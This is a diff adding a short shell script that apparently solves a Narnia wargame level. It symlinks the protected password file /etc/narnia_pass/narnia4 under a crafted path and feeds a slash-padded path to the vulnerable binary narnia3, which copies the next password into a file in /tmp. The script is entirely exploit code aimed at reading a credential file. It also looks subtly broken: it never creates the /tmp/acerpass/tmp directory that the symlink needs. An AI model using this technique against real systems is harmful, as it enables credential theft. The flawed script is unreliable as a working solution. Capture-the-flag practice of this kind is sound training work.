@@ -1,0 +1,7 @@
+touch /tmp/spadepass
+mkdir /tmp/acerpass
+
+ln -s /etc/narnia_pass/narnia4 /tmp/acerpass/tmp/spadepass
+/narnia/narnia3 ////////////////////tmp/acerpass/tmp/spadepass
+
+cat /tmp/spadepass
